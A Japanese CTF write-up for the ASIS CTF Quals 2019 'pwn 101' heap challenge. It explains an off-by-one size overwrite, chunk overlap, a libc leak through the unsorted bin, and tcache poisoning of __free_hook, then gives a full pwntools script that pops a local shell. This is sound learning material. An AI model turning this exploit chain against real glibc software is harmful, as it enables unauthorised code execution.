---
tags: pwn
---

# ASIS CTF Quals 2019 - pwn 101

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### Outline

当たり前のようにchecksecフルアーマー。free後にポインタが0クリアされてしまうのでUAFもDouble Freeも難しい。おそらく唯一の脆弱性としてcreate時にoff-by-one(任意値)がある。
これで真下のチャンクのサイズを書き換えて"真下のチャンク(チャンク1)+更にもう1つ下のチャンク(チャンク2)"分の大きさにしfreeする。
するとこの2つのチャンクが結合したようなチャンクがfreeされたとみなされてBinに送られる。
この時、事前に対応するサイズのtcacheを溢れさせておけばUnsorted Binに送られるので再びcreateを呼ぶと切り出され、余ったチャンクがUnsorted Binに繋がれる。
先程の"チャンク2"を示すポインタは生きているのでここが繋がるように切り出せば`&main_arena->top`が開示される。
あとはチャンク2を再び確保すると別のポインタで同じチャンクを指すようになるのでDouble Freeからいつものtcache poisoningで`__free_hook`を書き換える。

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

mainはただの選択肢のみなのでデコンパイルは省略する。
脆弱性があったのはcreate部分、ここのデコンパイル結果はこちら。

```clike
void create(void)

{
  long lVar1;
  void *p1;
  void *p2;
  long in_FS_OFFSET;
  int size;
  uint idx;
  long canary;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  idx = 0;
  while (((int)idx < 10 && (*(long *)(&DAT_00302048 + (long)(int)idx * 0x18) != 0))) {
    idx = idx + 1;
  }
  if (idx == 10) {
    puts("You can\'t add any more addresses.");
  }
  else {
    printf("Description Length: ");
    __isoc99_scanf(&DAT_001010ca,&size);
    if ((size < 0) || (0x2000 < size)) {
      puts("Invalid size.");
    }
    else {
      p1 = malloc(0x20);
      *(void **)(&DAT_00302048 + (long)(int)idx * 0x18) = p1;
      p2 = malloc((long)size);
      *(void **)(&DAT_00302050 + (long)(int)idx * 0x18) = p2;
      size = size + 1;
      printf("Phone Number: ");
      __isoc99_scanf(&DAT_001010ca,&DAT_00302040 + (long)(int)idx * 0x18,&DAT_00302040);
      printf("Name: ");
      read(0,*(void **)(&DAT_00302048 + (long)(int)idx * 0x18),0x20);
      printf("Description: ");
      read(0,*(void **)(&DAT_00302050 + (long)(int)idx * 0x18),(long)size);
      printf("Added an address: index=%d\n",(ulong)idx);
    }
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

だいたいこんな感じ↓の構造体をcreateして、その配列を`&DAT_00302040`に用意しているように見える

```clike
struct addr {
    int phone;
    char *name;
    char *desc;
}
```

脆弱性となっているのは`malloc(size)`した後の`size = size + 1`の部分で更にこの後、`size`をインクリメントして`size`分だけ`read`している。これはoff-by-one errorである。

一方でdeleteはめちゃくちゃ防御が硬い、free時にポインタは`name`も`desc`も消される。

```clike
void delete(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Index: ");
  __isoc99_scanf(&DAT_001010ca,&local_14);
  if ((local_14 < 0) || (9 < local_14)) {
    puts("Invalid index.");
  }
  else {
    if (*(long *)(&DAT_00302048 + (long)local_14 * 0x18) == 0) {
      puts("Unused address.");
    }
    else {
      free(*(void **)(&DAT_00302048 + (long)local_14 * 0x18));
      free(*(void **)(&DAT_00302050 + (long)local_14 * 0x18));
      *(undefined8 *)(&DAT_00302040 + (long)local_14 * 0x18) = 0;
      *(undefined8 *)(&DAT_00302048 + (long)local_14 * 0x18) = 0;
      *(undefined8 *)(&DAT_00302050 + (long)local_14 * 0x18) = 0;
      puts("OK.");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

インデックスチェックも完璧で使用済みのポインタは全部ヌルポインタに書き換えられていることから素直にDouble FreeやUAFは出来ない。

### tcacheを満杯にする

今回もUnsorted Binを利用してlibc leakをするので放り込みたいチャンクのサイズに該当するtcacheは7回freeで満杯にさせておく。
しかもこれをすることで`name`用のサイズ0x20のmallocは7回までなら(freeをするなら更に増える)ここから取ってくれるようになり、Heap領域で複雑な事をする際に邪魔にならなくなる、やったね。

### off-by-oneでサイズ書き換え

[(study) - off-by-one error](/@Xornet/Bk1OIIq6U)ではHouse of Einherjarに代表されるPREV_INUSE潰しからBackward Consolidationを利用した手法をまとめたが、今回はせっかく任意バイトを書き込めるので真下のチャンクのサイズを大きくなるよう書き換えてチャンクをOverlapさせる。

次のような連続するチャンク`chunk0, chunk1`を考える。`chunk1`はサイズ0x110とする

```
chunk0       : ...
...
chunk1 - 0x10: 00 00 00 00 00 00 00 00 | 11 01 00 00 00 00 00 00
chunk1       : ...
```

この問題ではcreate時にしかチャンクに対して書き込みを行わないので一旦freeしてから再確保する等で`chunk1`生成後に`chunk0`に書き込みを行えたとする。
off-by-one errorによって`chunk0`に書き込みをした際に1バイト余分に書き込めてしまうので`chunk1`のサイズヘッダ部分を書き換えることが出来る。
この例では`11 01`の先頭バイトが書き換えられるので例えば`a1 01`のようになる。後で使うのでPREV_INUSEを立てておくよう書き換える。

### チャンクのOverlap

今回狙うのはチャンクのoverlapによってUnsorted Binにまだ使えるポインタが指しているチャンクを内包したチャンクを送り込むことである。これが出来ればUnsorted Binの切り出しによってまだ生きているチャンクをshowすることで`main_arena->top`があるアドレスを入力出来る。先程のサイズ書き換えの説明によって実際より大きいサイズを偽装出来ることがわかったのでこれを利用する。

次のようなメモリレイアウトを考える。

```
chunk0       : ...
...
chunk1 - 0x10: 00 00 00 00 00 00 00 00 | 11 01 00 00 00 00 00 00
chunk1       : ...
...
chunk2 - 0x10: 00 00 00 00 00 00 00 00 | 61 00 00 00 00 00 00 00
chunk2       : ...
```

新たに`chunk2`というサイズ0x60のチャンクを用意した。したがって`chunk1`から`chunk2`終端までの領域のサイズは0x60+0x110 = 0x170になる。ということは`chunk0`のoff-by-one errorによってサイズヘッダ部分を`71 01`に書き換えると`chunk1`をfreeした際にサイズ0x170のチャンクがfreeされた扱いになる。
前述の処理によってサイズ0x170のtcacheを満杯にし、PREV_INUSEが立っており、下のチャンクも整えておけばtopや他チャンクとの結合は起こらずUnsorted Binに放り込まれるはずである。
freeしたのはあくまで`chunk1`を指すポインタなので`chunk2`を指すポインタはまだ生きている。これを利用した下記のようにUnsorted Bin Attackを行う。

### Unsorted Bin経由のlibc leak

Unsorted Binに入っているチャンクは次のような形になる(`---`はプログラムから見たチャンク境界)。

```
chunk1 - 0x10  :       (prev_size)       | 71 01 00 00 00 00 00 00
------------------------------------------------------------------
chunk1         :    (main_arena->top)    | (main_arena->top)
chunk1 + 0x10  : ...
...
chunk1 + 0x100 : 00 00 00 00 00 00 00 00 | 61 00 00 00 00 00 00 00
chunk2         : ...
...
------------------------------------------------------------------
```

ここで`chunk1`はfreeされてしまったので既にここを指すポインタは生きていない。よってこの状態では`main_arena->top`を指すアドレスは手に入らない。そこで`malloc(0x100)`のようにサイズ0x110のチャンクを切り出すmallocを発動させる。すると`chunk1`の元々のサイズが0x110だったのでこの部分が綺麗に切り出されてUnsorted Binは`chunk2`に繋がり、`chunk2`のfd, bkは`main_arena->top`を指すようになる。
`chunk2`は未だにfreeされておらずポインタが生きているのでここをshowで読めばlibc leakが出来る。

### いつもの

libc leakが出来たのであとは`__free_hook`を書き換えるだけである。`chunk2`を指すポインタはまだ生きている上にUnsorted Binに`chunk2`が繋がれているのでサイズ0x60(以下)のチャンクを切り出すようなmallocを発動させれば`chunk2`を指すポインタが別のインデックスとして手に入る。
というわけでこの2つをdeleteすればDouble Freeになるのであとはいつものtcache poisoningで書き換える。
ちなみにUnsorted Binに放り込む際に用意した下のチャンクに`"/bin/sh"`を仕込んでおけばわざわざ新しいチャンクを確保しなくてもここのdelete時に`system("/bin/sh")`が発動する。

## Code

※実際に要求したサイズ等は↑の解説で使った数値と異なっているで注意

```python
from pwn import p64, u64, process, ELF


def select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def create(s, size, desc=b"junk", name=b"unko", phone=b"114514"):
    select(s, b"1")
    s.recvuntil(b"Length: ")
    s.sendline(str(size))
    s.recvuntil(b"Phone Number: ")
    s.sendline(phone)
    s.recvuntil(b"Name: ")
    s.send(name)
    s.recvuntil(b"Description: ")
    s.send(desc)
    s.recvuntil(b"index=")
    res = s.recvline().rstrip()
    return int(res)


def show(s, idx):
    select(s, b"2")
    s.recvuntil(b"Index: ")
    s.sendline(str(idx))
    s.recvuntil(b"Description : ")
    res = s.recvline().rstrip()
    return res


def delete(s, idx):
    select(s, b"3")
    s.recvuntil(b"Index: ")
    s.sendline(str(idx))


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    """
        create: off-by-oneがある(nullだけでなく任意バイトを注ぎ込める)
        delete: ポインタはクリアされる -> Double Free, UAFはむずい
    """
    libc = ELF("./libc-2.27.so")
    arena_libc = 0x3ebc40
    free_hook_libc = libc.symbols["__free_hook"]
    system_libc = libc.symbols["system"]
    s = process("./pwn101.elf")

    # fill tcache
    fill_size = 0x170  # chunksize: 0x180
    for _ in range(7):
        create(s, fill_size)

    # avoid top conslidation
    create(s, 0x38, b"seven")  # 7
    # fill
    for i in range(7):
        delete(s, i)

    # overlaped chunks (sum of size: 0x180)
    create(s, 0x108)  # 0
    create(s, 0x68)  # 1

    # avoid top consolidation
    create(s, 0x58)  # 2
    create(s, 0x48, b"/bin/sh\x00")  # 3, ready for system("/bin/sh")

    # reallocate and write next size by off-by-one (0x111 -> 0x181)
    delete(s, 7)
    create(s, 0x38, b"4" * 0x38 + b"\x81")  # 4

    # send to unsorted bin
    delete(s, 0)
    create(s, 0x108)  # unsorted bin -> chunk1
    libc_base = u64(show(s, 1).ljust(8, b"\x00")) - arena_libc - 0x60
    print(libc_base)

    # write to __free_hook
    idx = create(s, 0x68)
    delete(s, idx)
    delete(s, 1)
    create(s, 0x68, p64(libc_base + free_hook_libc))
    create(s, 0x68)
    create(s, 0x68, p64(libc_base + system_libc))

    delete(s, 3)
    s.interactive()

```

## Flag

ローカルでシェル取っただけなので無いです

## 参考Writeup

* <https://ctftime.org/writeup/14843>: 最初、PREV_INUSE潰しで解こうとしたがこれ見て真下のチャンクのサイズを偽装出来る事に気づいたので多少異なるOverlap方法で解いた。

## 反省点

* サイズの計算を手でしない、Pwngdbが無かったら死んでた

## 感想

初off-by-one、嬉しい。しかも各方面のWriteupとはやや違ったOverlap方法で解けて2重に嬉しかったです。
あとPwngdb初めて使いました(pwndbgやgefを用意せずpedaのままで使えるらしいので)、`heapinfo`コマンドのおかげでサイズの指定ミスに気づけてよかったです。
